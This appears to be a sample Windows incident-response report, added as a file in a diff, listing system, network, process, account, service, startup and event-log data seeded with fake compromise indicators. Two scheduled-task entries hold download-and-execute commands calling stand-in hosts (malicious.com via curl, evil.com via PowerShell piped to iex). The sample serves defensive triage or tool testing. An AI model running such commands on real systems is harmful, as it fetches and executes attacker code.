@@ -1,0 +1,333 @@
+===============================================
+Windows Emergency Response Report
+Generated: 2024-06-07 10:30:15
+===============================================
+
+===== SYSTEM INFORMATION =====
+
+----- System Details -----
+Host Name:                 DESKTOP-ABC123
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.19041 N/A Build 19041
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Administrator
+Registered Organization:   
+Product ID:                00331-10000-00001-AA123
+Original Install Date:     1/15/2024, 9:30:00 AM
+System Boot Time:          6/7/2024, 8:15:30 AM
+System Manufacturer:       Dell Inc.
+System Model:              OptiPlex 7090
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 142 Stepping 12 GenuineIntel ~2400 Mhz
+BIOS Version:              Dell Inc. 2.8.0, 3/15/2023
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume2
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     16,384 MB
+Available Physical Memory: 8,192 MB
+Virtual Memory: Max Size:  32,768 MB
+Virtual Memory: Available: 16,384 MB
+Virtual Memory: In Use:    16,384 MB
+
+----- Windows Version -----
+Microsoft Windows [Version 10.0.19041.1052]
+
+----- Hostname -----
+DESKTOP-ABC123
+
+===== NETWORK INFORMATION =====
+
+----- Network Configuration -----
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : DESKTOP-ABC123
+   Primary Dns Suffix  . . . . . . . : 
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Intel(R) Ethernet Connection
+   Physical Address. . . . . . . . . : 00-1A-2B-3C-4D-5E
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 192.168.1.100(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.1.1
+   DHCP Server . . . . . . . . . . . : 192.168.1.1
+   DNS Servers . . . . . . . . . . . : 8.8.8.8
+                                       8.8.4.4
+
+----- Network Connections -----
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1234
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2345
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    192.168.1.100:139      0.0.0.0:0              LISTENING       4
+  TCP    192.168.1.100:445      192.168.1.50:52341    ESTABLISHED     4
+  TCP    192.168.1.100:3389     192.168.1.200:51234   ESTABLISHED     2345
+  TCP    192.168.1.100:4444     10.0.0.1:12345        ESTABLISHED     6789
+
+----- Listening Ports -----
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1234
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2345
+  TCP    0.0.0.0:4444           0.0.0.0:0              LISTENING       6789
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+
+===== PROCESS INFORMATION =====
+
+----- Running Processes -----
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Services                   0          8 K
+System                           4 Services                   0        140 K
+smss.exe                       344 Services                   0      1,084 K
+csrss.exe                      424 Services                   0      4,356 K
+wininit.exe                    500 Services                   0      3,784 K
+csrss.exe                      508 Console                    1      8,912 K
+winlogon.exe                   564 Console                    1      6,128 K
+services.exe                   612 Services                   0      8,484 K
+lsass.exe                      620 Services                   0     12,284 K
+svchost.exe                    728 Services                   0     15,672 K
+svchost.exe                    796 Services                   0      8,936 K
+svchost.exe                    884 Services                   0     25,148 K
+cmd.exe                       1234 Console                    1      3,456 K
+powershell.exe                2345 Console                    1     45,678 K
+notepad.exe                   3456 Console                    1      8,912 K
+suspicious.exe                6789 Console                    1     12,345 K
+
+----- Suspicious Processes -----
+Node,Name,ProcessId,CommandLine
+DESKTOP-ABC123,cmd.exe,1234,"cmd.exe /c ""download.bat"""
+DESKTOP-ABC123,powershell.exe,2345,"powershell.exe -enc aGFja2VyX2NvbW1hbmQ="
+DESKTOP-ABC123,suspicious.exe,6789,"C:\temp\suspicious.exe -connect 10.0.0.1:4444"
+
+===== USER AND SECURITY INFORMATION =====
+
+----- Current User -----
+DESKTOP-ABC123\administrator
+
+----- Current User Privileges -----
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State   
+============================= ==================================== ========
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process  Disabled
+SeSecurityPrivilege           Manage auditing and security log     Disabled
+SeTakeOwnershipPrivilege      Take ownership of files or objects   Disabled
+SeLoadDriverPrivilege         Load and unload device drivers       Disabled
+SeSystemProfilePrivilege      Profile system performance           Disabled
+SeSystemtimePrivilege         Change the system time               Disabled
+SeProfileSingleProcessPrivilege Profile single process             Disabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority        Disabled
+SeCreatePagefilePrivilege     Create a pagefile                    Disabled
+SeBackupPrivilege             Back up files and directories        Disabled
+SeRestorePrivilege            Restore files and directories        Disabled
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeDebugPrivilege              Debug programs                       Enabled 
+SeSystemEnvironmentPrivilege  Modify firmware environment values   Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+SeRemoteShutdownPrivilege     Force shutdown from a remote system  Disabled
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeManageVolumePrivilege       Perform volume maintenance tasks     Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+SeCreateSymbolicLinkPrivilege Create symbolic links                Disabled
+
+----- All Users -----
+User accounts for \\DESKTOP-ABC123
+
+-------------------------------------------------------------------------------
+Administrator            Guest                    testuser                 
+hackuser123              DefaultAccount           WDAGUtilityAccount       
+The command completed successfully.
+
+----- Administrators Group -----
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+hackuser123
+The command completed successfully.
+
+===== SERVICE INFORMATION =====
+
+----- Running Services -----
+SERVICE_NAME: AdobeARMservice
+DISPLAY_NAME: Adobe Acrobat Update Service
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 4  RUNNING 
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+SERVICE_NAME: AudioEndpointBuilder
+DISPLAY_NAME: Windows Audio Endpoint Builder
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 4  RUNNING 
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+SERVICE_NAME: BackdoorService
+DISPLAY_NAME: System Maintenance Service
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 4  RUNNING 
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+===== STARTUP AND SCHEDULED TASKS =====
+
+----- Startup Programs -----
+Node,Caption,Command,Location
+DESKTOP-ABC123,"Adobe Reader Speed Launcher","C:\Program Files (x86)\Adobe\Reader 11.0\Reader\Reader_sl.exe",HKU\S-1-5-21-123456789-1234567890-123456789-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+DESKTOP-ABC123,"Suspicious Startup","C:\temp\malware.exe -startup",HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+DESKTOP-ABC123,"Windows Security","C:\ProgramData\WindowsDefender\update.exe",HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+----- Scheduled Tasks -----
+TaskName,State,Author,TaskToRun
+"\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser",Ready,Microsoft Corporation,"%windir%\system32\compattelrunner.exe -maintenance"
+"\SuspiciousTask",Ready,DESKTOP-ABC123\Administrator,"cmd.exe /c curl http://malicious.com/download.exe -o C:\temp\payload.exe"
+"\WindowsUpdate",Ready,DESKTOP-ABC123\Administrator,"powershell.exe -WindowStyle Hidden -Command Invoke-WebRequest http://evil.com/backdoor.ps1 | iex"
+
+===== REGISTRY INFORMATION =====
+
+----- Run Keys -----
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    Adobe Reader Speed Launcher    REG_SZ    "C:\Program Files (x86)\Adobe\Reader 11.0\Reader\Reader_sl.exe"
+    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
+    MaliciousStartup    REG_SZ    "C:\temp\backdoor.exe"
+
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    OneDrive    REG_SZ    "C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
+    SuspiciousApp    REG_SZ    "C:\Users\Administrator\AppData\Roaming\suspicious.exe"
+
+===== EVENT LOGS =====
+
+----- Security Event Log (Last 50 entries) -----
+Event[1]:
+  Log Name: Security
+  Source: Microsoft-Windows-Security-Auditing
+  Date: 2024-06-07T08:15:30.123Z
+  Event ID: 4625
+  Task Category: Logon
+  Level: Information
+  Keywords: Audit Failure
+  User: N/A
+  Computer: DESKTOP-ABC123
+  Description:
+An account failed to log on.
+
+Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Logon Type:			3
+
+Account For Which Logon Failed:
+	Security ID:		S-1-0-0
+	Account Name:		administrator
+	Account Domain:		DESKTOP-ABC123
+
+Failure Information:
+	Failure Reason:		Unknown user name or bad password.
+	Status:			0xC000006D
+	Sub Status:		0xC000006A
+
+Process Information:
+	Caller Process ID:	0x0
+	Caller Process Name:	-
+
+Network Information:
+	Workstation Name:	ATTACKER-PC
+	Source Network Address:	10.0.0.1
+	Source Port:		52341
+
+Event[2]:
+  Log Name: Security
+  Source: Microsoft-Windows-Security-Auditing
+  Date: 2024-06-07T08:20:15.456Z
+  Event ID: 4672
+  Task Category: Special Logon
+  Level: Information
+  Keywords: Audit Success
+  User: DESKTOP-ABC123\Administrator
+  Computer: DESKTOP-ABC123
+  Description:
+Special privileges assigned to new logon.
+
+Subject:
+	Security ID:		S-1-5-21-123456789-1234567890-123456789-500
+	Account Name:		Administrator
+	Account Domain:		DESKTOP-ABC123
+	Logon ID:		0x12345
+
+Privileges:		SeSecurityPrivilege
+			SeBackupPrivilege
+			SeRestorePrivilege
+			SeTakeOwnershipPrivilege
+			SeDebugPrivilege
+			SeSystemEnvironmentPrivilege
+			SeLoadDriverPrivilege
+			SeImpersonatePrivilege
+
+===== NETWORK SECURITY =====
+
+----- Firewall Status -----
+Domain Profile Settings:
+----------------------------------------------------------------------
+State                                 ON
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Enable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Private Profile Settings:
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    Enable
+LocalConSecRules                      Enable
+InboundUserNotification               Enable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Public Profile Settings:
+----------------------------------------------------------------------
+State                                 ON
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    Enable
+LocalConSecRules                      Enable
+InboundUserNotification               Enable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+===============================================
+Report Generation Completed: 2024-06-07 10:45:30
+===============================================
